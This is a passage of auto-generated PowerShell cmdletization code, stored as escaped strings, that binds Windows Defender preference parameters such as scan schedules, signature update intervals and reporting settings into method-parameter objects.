$__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ReportingNonCriticalTimeOut')) {\r\n          [object]$__cmdleti"
"zation_value = ${ReportingNonCriticalTimeOut}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingNonCriticalTimeOut'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingNonCriticalTimeOut'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ServiceHealthReportInterval')) {\r\n          [object]$__cmdletization_value = ${ServiceHealthReportInterval}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ServiceHealthReportInterval'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ServiceHealthReportInterval'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ReportDynamicSignatureDroppedEvent')) {\r\n          [object]$__cmdletization_value = ${ReportDynamicSignatureDroppedEvent}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportDynamicSignatureDroppedEvent'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportDynamicSignatureDroppedEvent'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ScanAvgCPULoadFactor')) {\r\n          [object]$__cmdletization_value = ${ScanAvgCPULoadFactor}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanAvgCPULoadFactor'; ParameterType = 'System.Byte'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanAvgCPULoadFactor'; ParameterType = 'System.Byte'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('CheckForSignaturesBeforeRunningScan')) {\r\n          [object]$__cmdletization_value = ${CheckForSignaturesBeforeRunningScan}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CheckForSignaturesBeforeRunningScan'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CheckForSignaturesBeforeRunningScan'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ScanPurgeItemsAfterDelay')) {\r\n          [object]$__cmdletization_value = ${ScanPurgeItemsAfterDelay}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanPurgeItemsAfterDelay'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanPurgeItemsAfterDelay'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ScanOnlyIfIdleEnabled')) {\r\n          [object]$__cmdletization_value = ${ScanOnlyIfIdleEnabled}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanOnlyIfIdleEnabled'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanOnlyIfIdleEnabled'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ScanParameters')) {\r\n          [object]$__cmdletization_value = ${ScanParameters}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanParameters'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ScanType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanParameters'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ScanType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ScanScheduleDay')) {\r\n          [object]$__cmdletization_value = ${ScanScheduleDay}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleDay'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Day'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleDay'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Day'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ScanScheduleQuickScanTime')) {\r\n          [object]$__cmdletization_value = ${ScanScheduleQuickScanTime}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleQuickScanTime'; ParameterType = 'System.DateTime'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleQuickScanTime'; ParameterType = 'System.DateTime'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ScanScheduleTime')) {\r\n          [object]$__cmdletization_value = ${ScanScheduleTime}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleTime'; ParameterType = 'System.DateTime'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleTime'; ParameterType = 'System.DateTime'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ThrottleForScheduledScanOnly')) {\r\n          [object]$__cmdletization_value = ${ThrottleForScheduledScanOnly}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThrottleForScheduledScanOnly'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThrottleForScheduledScanOnly'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SignatureFirstAuGracePeriod')) {\r\n          [object]$__cmdletization_value = ${SignatureFirstAuGracePeriod}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureFirstAuGracePeriod'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $_"
"_cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureFirstAuGracePeriod'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SignatureAuGracePeriod')) {\r\n          [object]$__cmdletization_value = ${SignatureAuGracePeriod}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureAuGracePeriod'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureAuGracePeriod'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SignatureDefinitionUpdateFileSharesSources')) {\r\n          [object]$__cmdletization_value = ${SignatureDefinitionUpdateFileSharesSources}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureDefinitionUpdateFileSharesSources'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureDefinitionUpdateFileSharesSources'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SignatureDisableUpdateOnStartupWithoutEngine')) {\r\n          [object]$__cmdletization_value = ${SignatureDisableUpdateOnStartupWithoutEngine}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureDisableUpdateOnStartupWithoutEngine'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureDisableUpdateOnStartupWithoutEngine'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SignatureFallbackOrder')) {\r\n          [object]$__cmdletization_value = ${SignatureFallbackOrder}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureFallbackOrder'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureFallbackOrder'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SharedSignaturesPath')) {\r\n          [object]$__cmdletization_value = ${SharedSignaturesPath}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SharedSignaturesPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SharedSignaturesPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SharedSignaturesPathUpdateAtScheduledTimeOnly')) {\r\n          [object]$__cmdletization_value = ${SharedSignaturesPathUpdateAtScheduledTimeOnly}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SharedSignaturesPathUpdateAtScheduledTimeOnly'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SharedSignaturesPathUpdateAtScheduledTimeOnly'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SignatureScheduleDay')) {\r\n          [object]$__cmdletization_value = ${SignatureScheduleDay}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureScheduleDay'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Day'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureScheduleDay'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Day'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SignatureScheduleTime')) {\r\n          [object]$__cmdletization_value = ${SignatureScheduleTime}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureScheduleTime'; ParameterType = 'System.DateTime'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureScheduleTime'; ParameterType = 'System.DateTime'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SignatureUpdateCatchupInterval')) {\r\n          [object]$__cmdletization_value = ${SignatureUpdateCatchupInterval}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureUpdateCatchupInterval'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureUpdateCatchupInterval'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SignatureUpdateInterval')) {\r\n          [object]$__cmdletization_value = ${SignatureUpdateInterval}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureUpdateInterval'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureUpdateInterval'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SignatureBlobUpdateInterval')) {\r\n          [object]$__cmdletization_value = ${SignatureBlobUpdateInterval}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureBlobUpdateInterval'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureBlobUpdateInterval'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SignatureBlobFileSharesSources')) {\r\n          [object]$__cmdletization_value = ${SignatureBlobFileSharesSources}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureBlobFileSharesSources'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureBlobFileSharesSources'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_d"
"efaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('MeteredConnectionUpdates')) {\r\n          [object]$__cmdletization_value = ${MeteredConnectionUpdates}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MeteredConnectionUpdates'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MeteredConnectionUpdates'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('AllowNetworkProtectionOnWinServer')) {\r\n          [object]$__cmdletization_value = ${AllowNetworkProtectionOnWinServer}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowNetworkProtectionOnWinServer'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowNetworkProtectionOnWinServer'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableDatagramProcessing')) {\r\n          [object]$__cmdletization_value = ${DisableDatagramProcessing}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableDatagramProcessing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableDatagramProcessing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('EnableConvertWarnToBlock')) {\r\n          [object]$__cmdletization_value = ${EnableConvertWarnToBlock}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableConvertWarnToBlock'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableConvertWarnToBlock'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableCpuThrottleOnIdleScans')) {\r\n          [object]$__cmdletization_value = ${DisableCpuThrottleOnIdleScans}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCpuThrottleOnIdleScans'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCpuThrottleOnIdleScans'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('MAPSReporting')) {\r\n          [object]$__cmdletization_value = ${MAPSReporting}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MAPSReporting'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.MAPSReportingType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MAPSReporting'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.MAPSReportingType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SubmitSamplesConsent')) {\r\n          [object]$__cmdletization_value = ${SubmitSamplesConsent}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SubmitSamplesConsent'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.SubmitSamplesConsentType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SubmitSamplesConsent'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.SubmitSamplesConsentType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableAutoExclusions')) {\r\n          [object]$__cmdletization_value = ${DisableAutoExclusions}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableAutoExclusions'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableAutoExclusions'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisablePrivacyMode')) {\r\n          [object]$__cmdletization_value = ${DisablePrivacyMode}\r\n          $__cmdletization_methodParameter = 